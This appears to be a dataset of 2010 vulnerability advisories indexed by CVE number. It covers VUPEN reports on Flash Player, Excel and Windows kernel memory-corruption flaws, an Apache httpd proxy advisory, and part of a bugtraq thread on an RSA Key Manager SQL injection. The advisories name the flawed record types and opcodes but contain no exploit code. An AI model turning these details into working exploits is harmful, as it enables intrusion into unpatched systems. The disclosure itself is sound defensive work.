Subscription users of 2.5.x and earlier may also mitigate this issue by upgrading 2.5.6.SEC02 or 2.5.7.SR01
Credit:
The issue was discovered by Meder Kydyraliev, Google Security Team
References:
[1] http://www.springsource.com/security/spring-framework"
15075,VUPEN Security Research - Adobe Flash Player GIF/JPEG Data Parsing Heap Overflow Vulnerabilities (CVE-2010-2167),,CVE-2010-2167,"VUPEN Security Research - Adobe Flash Player GIF/JPEG Data Parsing Heap Overflow Vulnerabilities (CVE-2010-2167)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Adobe Flash Player is a cross-platform browser-based application runtime
that delivers uncompromised viewing of expressive applications, content,
and videos across screens and browsers. Flash Player delivers breakthrough
web experiences to over 98% of Internet users."" from Adobe.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered two critical vulnerabilities
in Adobe Flash Player.
These vulnerabilities are caused due to heap overflows when processing
malformed GIF or JPEG data within a Flash file, which could be exploited
by attackers to execute arbitrary code by tricking a user into visiting a
specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Flash Player versions prior to 10.1.53.64
Adobe Flash Player versions prior to 9.0.277.0
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis, code execution exploits and proof-of-concept
codes are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Upgrade to Flash Player version 10.1.53.64 or 9.0.277.0 :
http://www.adobe.com/go/getflash
VI. CREDIT
--------------
These vulnerabilities were discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/exploits/
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/tpp/
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1421
http://www.adobe.com/support/security/bulletins/apsb10-14.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2167
IX. DISCLOSURE TIMELINE
-----------------------------
2010-01-15 - Vendor notified
2010-01-15 - Vendor response
2010-04-16 - Status update received
2010-06-02 - Status update received
2010-06-11 - Coordinated public Disclosure"
15076,"VUPEN Security Research - Adobe Flash Player ""newfunction"" Invalid Pointer Vulnerability (CVE-2010-2174)",,CVE-2010-2174,"VUPEN Security Research - Adobe Flash Player ""newfunction"" Invalid Pointer Vulnerability (CVE-2010-2174)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Adobe Flash Player is a cross-platform browser-based application runtime
that delivers uncompromised viewing of expressive applications, content,
and videos across screens and browsers. Flash Player delivers breakthrough
web experiences to over 98% of Internet users."" from Adobe.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Adobe Flash Player.
This vulnerability is caused due to an invalid pointer when processing
the ""newfunction"" operator (bytecode 0x44), which could be exploited by
attackers to execute arbitrary code by tricking a user into visiting a
specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Flash Player versions prior to 10.1.53.64
Adobe Flash Player versions prior to 9.0.277.0
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis, code execution exploits and proof-of-concept
codes are published through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Upgrade to Flash Player version 10.1.53.64 or 9.0.277.0 :
http://www.adobe.com/go/getflash
VI. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/exploits/
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/tpp/
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1421
http://www.adobe.com/support/security/bulletins/apsb10-14.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2174
IX. DISCLOSURE TIMELINE
-----------------------------
2010-03-08 - Vendor notified
2010-03-08 - Vendor response
2010-04-16 - Status update received
2010-06-02 - Status update received
2010-06-11 - Coordinated public Disclosure"
15077,"VUPEN Security Research - Adobe Flash Player ""newclass"" Invalid Pointer Vulnerability (CVE-2010-2173)",,CVE-2010-2173,"VUPEN Security Research - Adobe Flash Player ""newclass"" Invalid Pointer Vulnerability (CVE-2010-2173)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Adobe Flash Player is a cross-platform browser-based application runtime
that delivers uncompromised viewing of expressive applications, content,
and videos across screens and browsers. Flash Player delivers breakthrough
web experiences to over 98% of Internet users."" from Adobe.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Adobe Flash Player.
This vulnerability is caused due to an invalid pointer when processing
the ""newclass"" operator (bytecode 0x58), which could be exploited by
attackers to execute arbitrary code by tricking a user into visiting a
specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Flash Player versions prior to 10.1.53.64
Adobe Flash Player versions prior to 9.0.277.0
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis, code execution exploits and proof-of-concept
codes are published through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Upgrade to Flash Player version 10.1.53.64 or 9.0.277.0 :
http://www.adobe.com/go/getflash
VI. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/exploits/
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/tpp/
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1421
http://www.adobe.com/support/security/bulletins/apsb10-14.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2173
IX. DISCLOSURE TIMELINE
-----------------------------
2010-03-08 - Vendor notified
2010-03-08 - Vendor response
2010-04-16 - Status update received
2010-06-02 - Status update received
2010-06-11 - Coordinated public Disclosure"
15096,[advisory] httpd Timeout detection flaw (mod_proxy_http) CVE-2010-2068,,CVE-2010-2068,"Vulnerability; httpd Timeout detection flaw (mod_proxy_http) CVE-2010-2068
Classification; important
Description;
A timeout detection flaw in the httpd mod_proxy_http module causes
proxied response to be sent as the response to a different request,
and potentially served to a different client, from the HTTP proxy
pool worker pipeline.
This may represent a confidential data revealing flaw.
This affects only Netware, Windows or OS2 builds of httpd version
2.2.9 through 2.2.15, 2.3.4-alpha and 2.3.5-alpha, when the proxy
worker pools have been enabled. Earlier 2.2, 2.0 and 1.3 releases
were not affected.
Acknowledgements;
We would like to thank Loren Anderson for the thorough research
and reporting of this flaw.
Mitigation;
Apply any one of the following mitigations to avert the possibility
of confidential information disclosure.
* Do not load mod_proxy_http.
* Do not configure/enable any http proxy worker pools with ProxySet
or ProxyPass optional arguments.
* The straightforward workaround to disable mod_proxy_http's reuse
of backend connection pipelines is to set the following global
directive;
SetEnv proxy-nokeepalive 1
* Replace mod_proxy_http.so with a patched version, for source code
see http://www.apache.org/dist/httpd/patches/apply_to_2.2.15/ or
http://www.apache.org/dist/httpd/patches/apply_to_2.3.5/ and for
binaries see the http://www.apache.org/dist/httpd/binaries/ tree
for win32 or netware, as appropriate.
* Upgrade to Apache httpd 2.2.16 or higher, once released. There
is no tentative release date scheduled.
Update Released; 11th June 2010"
15122,"VUPEN Security Research - Microsoft Windows Kernel ""GetDCEx()"" Memory Corruption Vulnerability (CVE-2010-0484)",,CVE-2010-0484,"VUPEN Security Research - Microsoft Windows Kernel ""GetDCEx()"" Memory Corruption Vulnerability (CVE-2010-0484)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Windows is the operating system developed by Microsoft. As of
May 2010, Windows was the most widely used system, with more than 90% of
the worldwide usage share of operating systems according to Net
Application.""
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a vulnerability affecting
Microsoft Windows.
The vulnerability is caused by a memory corruption within the kernel-mode
device driver ""Win32k.sys"" when handling Device Contexts (DC) via the
""GetDCEx()"" function, which could be exploited by local attackers to gain
ring0 privileges via a specially crafted application.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Service Pack 2
Microsoft Windows XP Professional x64 Edition Service Pack 2
Microsoft Windows Server 2008 (32-bit) Service Pack 2
Microsoft Windows Server 2008 (32-bit)
Microsoft Windows Server 2008 (x64) Service Pack 2
Microsoft Windows Server 2008 (x64)
Microsoft Windows Server 2008 (Itanium) Service Pack 2
Microsoft Windows Server 2008 (Itanium)
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 SP2 (Itanium)
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows 2000 Service Pack 4
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a proof-of-concept
have been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Apply MS10-032 security update:
http://www.microsoft.com/technet/security/bulletin/ms10-032.mspx
VI. CREDIT
--------------
The vulnerability was discovered by Sebastien Renaud of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1389
http://www.microsoft.com/technet/security/bulletin/ms10-032.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0484
IX. DISCLOSURE TIMELINE
-----------------------------
2009-11-25 - Vendor notified
2009-11-25 - Vendor response
2009-11-30 - Status update received
2010-01-07 - Status update received
2010-03-31 - Status update received
2010-04-29 - Status update received
2010-06-08 - Coordinated public Disclosure"
15123,VUPEN Security Research - Microsoft Office Excel EDG Heap Overflow Vulnerability (CVE-2010-1250),,CVE-2010-1250,"VUPEN Security Research - Microsoft Office Excel EDG Heap Overflow Vulnerability (CVE-2010-1250)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use."" (microsoft.com)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Office Excel.
The vulnerability is caused by a heap overflow error when processing
malformed EDG (recType 0x88) and Publisher (recType 0x89) records, which
could be exploited by attackers to execute arbitrary code by tricking
a user into opening a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office Excel 2002 Service Pack 3
Microsoft Office 2004 for Mac
Microsoft Office 2008 for Mac
Open XML File Format Converter for Mac
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
have been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Apply MS10-038 security update:
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
VI. CREDIT
--------------
The vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1395
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1250
IX. DISCLOSURE TIMELINE
-----------------------------
2009-12-03 - Vendor notified
2009-12-03 - Vendor response
2009-12-23 - Status update received
2010-02-19 - Status update received
2010-04-27 - Status update received
2010-06-08 - Coordinated public Disclosure"
15124,VUPEN Security Research - Microsoft Office Excel ExternName Buffer Overflow Vulnerability (CVE-2010-1249),,CVE-2010-1249,"VUPEN Security Research - Microsoft Office Excel ExternName Buffer Overflow Vulnerability (CVE-2010-1249)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use."" (microsoft.com)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Office Excel.
The vulnerability is caused by a buffer overflow error when processing
malformed ExternName (recType 0x23) records, which could be exploited by
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office Excel 2002 Service Pack 3
Microsoft Office 2004 for Mac
Microsoft Office 2008 for Mac
Open XML File Format Converter for Mac
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a proof-of-concept
have been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Apply MS10-038 security update:
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
VI. CREDIT
--------------
The vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1395
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1249
IX. DISCLOSURE TIMELINE
-----------------------------
2009-12-03 - Vendor notified
2009-12-03 - Vendor response
2009-12-23 - Status update received
2010-02-19 - Status update received
2010-04-27 - Status update received
2010-06-08 - Coordinated public Disclosure"
15125,VUPEN Security Research - Microsoft Office Excel HFPicture Buffer Overflow Vulnerability (CVE-2010-1248),,CVE-2010-1248,"VUPEN Security Research - Microsoft Office Excel HFPicture Buffer Overflow Vulnerability (CVE-2010-1248)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use."" (microsoft.com)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Office Excel.
The vulnerability is caused by a buffer overflow error when processing
malformed HFPicture (recType 0x866) records, which could be exploited by
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office Excel 2002 Service Pack 3
Microsoft Office 2004 for Mac
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a proof-of-concept
have been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Apply MS10-038 security update:
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
VI. CREDIT
--------------
The vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1395
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1248
IX. DISCLOSURE TIMELINE
-----------------------------
2009-12-03 - Vendor notified
2009-12-03 - Vendor response
2009-12-23 - Status update received
2010-02-19 - Status update received
2010-04-27 - Status update received
2010-06-08 - Coordinated public Disclosure"
15126,VUPEN Security Research - Microsoft Office Excel RTD Stack Overflow Vulnerability (CVE-2010-1246),,CVE-2010-1246,"VUPEN Security Research - Microsoft Office Excel RTD Stack Overflow Vulnerability (CVE-2010-1246)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use."" (microsoft.com)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Office Excel.
The vulnerability is caused by a stack overflow error when processing
malformed RTD (recType 0x813) records, which could be exploited by
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office Excel 2002 Service Pack 3
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
have been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Apply MS10-038 security update:
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
VI. CREDIT
--------------
The vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1395
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1246
IX. DISCLOSURE TIMELINE
-----------------------------
2009-12-03 - Vendor notified
2009-12-03 - Vendor response
2009-12-23 - Status update received
2010-02-19 - Status update received
2010-04-27 - Status update received
2010-06-08 - Coordinated public Disclosure"
15127,VUPEN Security Research - Microsoft Office Excel SxView Memory Corruption Vulnerability (CVE-2010-1245),,CVE-2010-1245,"VUPEN Security Research - Microsoft Office Excel SxView Memory Corruption Vulnerability (CVE-2010-1245)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use."" (microsoft.com)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Office Excel.
The vulnerability is caused by a memory corruption error when processing
malformed SxView (recType 0xB0) records, which could be exploited by
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office Excel 2002 Service Pack 3
Microsoft Office 2004 for Mac
Microsoft Office 2008 for Mac
Open XML File Format Converter for Mac
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
have been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Apply MS10-038 security update:
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
VI. CREDIT
--------------
The vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1395
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1245
IX. DISCLOSURE TIMELINE
-----------------------------
2009-12-03 - Vendor notified
2009-12-03 - Vendor response
2009-12-23 - Status update received
2010-02-19 - Status update received
2010-04-27 - Status update received
2010-06-08 - Coordinated public Disclosure"
15128,VUPEN Security Research - Microsoft Office Excel WOPT Heap Corruption Vulnerability (CVE-2010-0824),,CVE-2010-0824,"VUPEN Security Research - Microsoft Office Excel WOPT Heap Corruption Vulnerability (CVE-2010-0824)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use."" (microsoft.com)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Office Excel.
The vulnerability is caused by a heap corruption error when processing
malformed WOPT (recType 0x80B) records, which could be exploited by
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office Excel 2002 Service Pack 3
Microsoft Office 2004 for Mac
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
have
been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Apply MS10-038 security update:
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
VI. CREDIT
--------------
The vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1395
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0824
IX. DISCLOSURE TIMELINE
-----------------------------
2009-12-03 - Vendor notified
2009-12-03 - Vendor response
2009-12-23 - Status update received
2010-02-19 - Status update received
2010-04-27 - Status update received
2010-06-08 - Coordinated public Disclosure"
15129,VUPEN Security Research - Microsoft Office Excel OBJ Stack Overflow Vulnerability (CVE-2010-0822),,CVE-2010-0822,"VUPEN Security Research - Microsoft Office Excel OBJ Stack Overflow Vulnerability (CVE-2010-0822)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use."" (microsoft.com)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
affecting Microsoft Office Excel.
The vulnerability is caused by a buffer overflow error when processing
malformed OBJ (recType 0x5D) records, which could be exploited by
attackers to execute arbitrary code by tricking a user into opening
a specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office Excel 2002 Service Pack 3
Microsoft Office 2004 for Mac
Microsoft Office 2008 for Mac
Open XML File Format Converter for Mac
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a proof-of-concept
have been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Apply MS10-038 security update:
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
VI. CREDIT
--------------
The vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1395
http://www.microsoft.com/technet/security/bulletin/ms10-038.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0822
IX. DISCLOSURE TIMELINE
-----------------------------
2009-11-16 - Vendor notified
2009-11-16 - Vendor response
2010-01-26 - Status update received
2010-03-03 - Status update received
2010-04-27 - Status update received
2010-06-08 - Coordinated public Disclosure"
15131,RE: RSA Key Manager SQL injection Vulnerability ( CVE-2010-1904 ),,CVE-2010-1904,"The only problem is that the upgrade is not free, so you either pay up or stay vulnerable.
> Date: Sat, 5 Jun 2010 08:38:55 -0600
> From: security_alert emc com
> To: bugtraq securityfocus com
> Subject: Re: RSA Key Manager SQL injection Vulnerability ( CVE-2010-1904 )
>
> What is the issue?
>
> This message is in response to the original message posted on June 3, 2010 addressing a SQL Injection vulnerability in the RSA Key Manager C Client version 1.5. The original message referenced CVE-2010-1904.
>
> A vulnerability has been identified in the RSA Key Manager (RKM) C client 1.5 that may expose the product to a SQL Injection attack. An attacker having access to encrypted data may be able to leverage this vulnerability in an attempt to alter the RKM C Client 1.5 cache.
>
> Affected Products:
> RKM C Client versions 1.5.x.x, all platforms (Windows, Linux, Solaris, HP-UX, etc).
>
> Unaffected Products:
> RKM C Client 2.0.x, all platforms
> RKM C Client 2.1.x, all platforms
> RKM C Client 2.2.x, all platforms
> RKM C Client 2.5.x, all platforms
> RKM C Client 2.7, all platforms
> All versions of RKM Java Client
> RKM PKCS#11 Module for LT0-4
> RKM PKCS#11 Module for Oracle TDE
> RKM Server, all versions and platforms
> RKM Appliance, all versions
> Customer using EMC PowerPath with RSA encryption
> Customer using Brocade Encryption Switches with RSA encryption
>
> What is the impact?
